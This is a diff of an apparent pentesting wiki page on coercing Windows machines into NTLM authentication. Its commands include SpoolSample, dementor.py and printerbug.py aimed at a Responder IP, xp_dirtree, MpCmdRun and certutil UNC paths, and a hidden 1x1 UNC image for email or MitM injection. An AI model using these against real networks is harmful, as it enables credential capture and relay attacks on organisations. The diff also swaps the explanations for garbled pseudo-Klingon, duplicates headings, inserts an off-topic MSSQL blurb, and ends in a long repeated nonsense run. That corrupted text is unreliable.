@@ -24,41 +24,32 @@ Note when printer send the notification to an arbitrary systems, it needs to **a
 ### Finding Windows Servers on the domain
 
 Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
-
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
+### qoSpooler qoHochDIchDI' qoSpooler Scanner
 
-### Finding Spooler services listening
-
-Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
-
+@mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) vItlhutlh qoSpooler qoHochDIchDI' qoSpooler Scanner vItlhutlh:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-
-You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
-
+**DaH jImej:**
+rpcdump.py cha'logh Linux vaj MS-RPRN Protocol laH.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
+### **ghItlhvam vItlhutlh**
 
-### Ask the service to authenticate against an arbitrary host
-
-You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
-
+[**SpoolSample vItlhutlh**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.** **ghItlhvam** vItlhutlh.
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-
-or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
-
+ghItlh **3xocyte's dementor.py** (https://github.com/NotMedic/NetNTLMtoSilverTicket) be'nal je **printerbug.py** (https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) vaj Linux'eS.
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-
 ### Combining with Unconstrained Delegation
 
 If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
@@ -78,47 +69,56 @@ By default, the **Exchange service runs as SYSTEM** and is given excessive privi
 If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
 
 ### Defender MpCmdRun
-
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
+### MSSQL
 
 ### MSSQL
 
+MSSQL is a relational database management system (RDBMS) developed by Microsoft. It is commonly used for storing and managing large amounts of data in various applications and systems. MSSQL supports the Structured Query Language (SQL) for querying and manipulating data.
+
+MSSQL can be a valuable target for hackers due to the sensitive information it often stores, such as user credentials, financial data, and personal information. By exploiting vulnerabilities in MSSQL, hackers can gain unauthorized access to the database, extract or modify data, and potentially cause significant damage to the targeted system or organization.
+
+To protect MSSQL from attacks, it is important to follow security best practices, such as:
+
+1. Regularly applying security patches and updates provided by Microsoft.
+2. Implementing strong and complex passwords for MSSQL user accounts.
+3. Enabling encryption for data transmission between the MSSQL server and client applications.
+4. Restricting network access to the MSSQL server by using firewalls and network segmentation.
+5. Monitoring and logging MSSQL activities to detect and respond to potential security incidents.
+6. Regularly backing up MSSQL databases to ensure data availability and recovery in case of a breach or system failure.
+
+By following these security measures, organizations can significantly reduce the risk of MSSQL-related security breaches and protect their valuable data from unauthorized access or manipulation.
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
-
 ### Certutil
 
-It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:
-
+certutil.exe lolbin (Microsoft-signed binary) jImej (NTLM authentication) vItlhutlh. [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce) 'e' vItlhutlh.
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-
 ## HTML injection
 
 ### Via email
 
 If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
 
+## HTML injection
+
+### emailDaq
+
+machinen loghmo' compromise jatlh **email address** user'e' vItlhutlh, **email with a 1x1 image** vItlhutlh jatlhbe'chugh, vaj jatlhbe'chugh email vItlhutlh.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-
-and when he opens it, he will try to authenticate.
-
 ### MitM
 
-If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
-
+vaj jImej vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhut
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-
 ## Cracking NTLMv1
 
 If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
